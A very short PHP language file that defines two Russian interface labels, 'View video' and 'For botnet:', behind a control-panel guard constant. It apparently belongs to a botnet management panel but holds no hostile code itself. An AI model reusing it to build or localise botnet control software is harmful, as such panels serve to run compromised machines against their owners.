<?php if(!defined('__CP__'))die();
define('LNG_REPORTS', 'Просмотр видео');
define('LNG_STATS_BOTNET', 'Для ботнета: ');

?>